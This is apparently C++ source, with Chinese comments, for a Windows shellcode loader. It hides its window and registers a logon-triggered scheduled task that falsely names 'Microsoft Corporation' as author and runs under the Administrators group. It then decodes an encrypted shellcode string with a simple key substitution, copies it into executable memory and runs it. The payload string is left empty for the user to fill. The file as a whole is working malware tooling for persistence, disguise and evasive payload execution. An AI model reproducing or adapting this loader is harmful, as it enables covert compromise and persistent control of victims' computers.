#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string>
#include <comdef.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积 
using namespace std;
unsigned char ss[8000];

int qidong(wstring PATH1) {
	//  初始化com接口
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		printf("\nCoInitializeEx failed: %x", hr);
		return 1;
	}
	//  设置 COM security levels
	hr = CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		0,
		NULL);
	if (FAILED(hr)) {
		printf("\nCoInitializeSecurity failed: %x", hr);
		CoUninitialize();
		return 1;
	}
	//  设置计划任务名称
	LPCWSTR wszTaskName = L"ATest";
	//	设置运行文件
	//wchar_t Path[100];
	//swprintf(Path, 100, L"%s", path4);
	wstring wstrExecutablePath = PATH1;
	//  创建Task Service对象
	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pService);
	if (FAILED(hr)) {
		printf("Failed to create an instance of ITaskService: %x", hr);
		CoUninitialize();
		return 1;
	}
	//  连接到Task Service
	hr = pService->Connect(_variant_t(), _variant_t(),
		_variant_t(), _variant_t());
	if (FAILED(hr)) {
		printf("ITaskService::Connect failed: %x", hr);
		pService->Release();
		CoUninitialize();
		return 1;
	}
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		printf("Cannot get Root Folder pointer: %x", hr);
		pService->Release();
		CoUninitialize();
		return 1;
	}
	pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);
	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	pService->Release();
	if (FAILED(hr)) {
		printf("Failed to create a task definition: %x", hr);
		pRootFolder->Release();
		CoUninitialize();
		return 1;
	}
	//  设置注册信息
	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr)) {
		printf("\nCannot get identification pointer: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	//  创建者
	hr = pRegInfo->put_Author(L"Microsoft Corporation");
	pRegInfo->Release();
	if (FAILED(hr)) {
		printf("\nCannot put identification info: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	ITaskSettings* pSettings = NULL;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr)) {
		printf("\nCannot get settings pointer: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->Release();
	if (FAILED(hr)) {
		printf("\nCannot put setting info: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		printf("\nCannot get trigger collection: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	//  创建触发器
	ITrigger* pTrigger = NULL;
	//  用户登陆时触发
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr)) {
		printf("\nCannot create the trigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	ILogonTrigger* pLogonTrigger = NULL;
	hr = pTrigger->QueryInterface(
		IID_ILogonTrigger, (void**)&pLogonTrigger);
	pTrigger->Release();
	if (FAILED(hr)) {
		printf("\nQueryInterface call failed for ILogonTrigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pLogonTrigger->put_Id(_bstr_t(L"Trigger1"));
	if (FAILED(hr))
		printf("\nCannot put the trigger ID: %x", hr);
	hr = pLogonTrigger->put_StartBoundary(_bstr_t(L"2005-01-01T12:05:00"));
	if (FAILED(hr))
		printf("\nCannot put the start boundary: %x", hr);
	hr = pLogonTrigger->put_EndBoundary(_bstr_t(L"2066-05-02T08:00:00"));
	if (FAILED(hr))
		printf("\nCannot put the end boundary: %x", hr);
	//  创建的userid
	hr = pLogonTrigger->put_UserId(_bstr_t(L""));
	pLogonTrigger->Release();
	if (FAILED(hr)) {
		printf("\nCannot add user ID to logon trigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	IActionCollection* pActionCollection = NULL;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		printf("\nCannot get Task collection pointer: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	//  设置执行操作
	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr)) {
		printf("\nCannot create the action: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(
		IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (FAILED(hr)) {
		printf("\nQueryInterface call failed for IExecAction: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
	pExecAction->Release();
	if (FAILED(hr)) {
		printf("\nCannot set path of executable: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	//  在ITaskFolder对象注册
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t(wszTaskName),
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(L"S-1-5-32-544"),
		_variant_t(),
		TASK_LOGON_GROUP,
		_variant_t(L""),
		&pRegisteredTask);
	if (FAILED(hr)) {
		printf("\nError saving the Task : %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return 1;
	}
	printf("\n Success! Task successfully registered. ");
	// Clean up
	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	CoUninitialize();
	return 0;
}

wstring stringToWstring(const std::string& str)
{
	LPCSTR pszSrc = str.c_str();
	int nLen = MultiByteToWideChar(CP_ACP, 0, pszSrc, -1, NULL, 0);
	if (nLen == 0)
		return std::wstring(L"");

	wchar_t* pwszDst = new wchar_t[nLen];
	if (!pwszDst)
		return std::wstring(L"");

	MultiByteToWideChar(CP_ACP, 0, pszSrc, -1, pwszDst, nLen);
	std::wstring wstr(pwszDst);
	delete[] pwszDst;
	pwszDst = NULL;

	return wstr;
}

int main() {
	char ExeFile[200];
	//得到当前文件路径名
	GetModuleFileName(NULL, ExeFile, 200);
	string s;
	wstring s1;
	s = ExeFile;
	s1 = stringToWstring(ExeFile);
	qidong(s1);
	char str[] = "";//此处为加密后的shellcode
	//string passwd1 = str;
	string str1(str);
	//密码
	string passwd1 = str1.substr(0, 10);
	//shellcode
	string shellcode1 = str1.substr(10, str1.length());
	//cout << passwd1 << endl;
	const char* passwd2 = passwd1.data();
	//cout << passwd2[0] << endl;
	const char* shellcode2 = shellcode1.data();
	//cout << shellcode2[0] << endl;
	//string shellcode3[8000];
	int k = 0;
	for (int i = 0; i < shellcode1.length(); i++)
	{
		int len1;
		len1 = shellcode2[i] - 48;
		//cout << len1 << endl;
		string dange = "";
		for (int j = 0; j < len1; j++)
		{
			string a = to_string(shellcode2[i + j + 1] - 48);
			int a1 = passwd1.find(a);
			string a2 = to_string(a1);
			dange.append(a2);
		}
		i = i + len1;
		int dange4 = std::stoi(dange);
		//cout << dange4 << endl;
		ss[k] = *((char*)&dange4);
		k = k + 1;
	}
	LPVOID Memory = VirtualAlloc(NULL, sizeof(ss), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Memory == NULL) { return 1; }
	memcpy(Memory, ss, sizeof(ss));
	((void(*)())Memory)();
	return 0;
}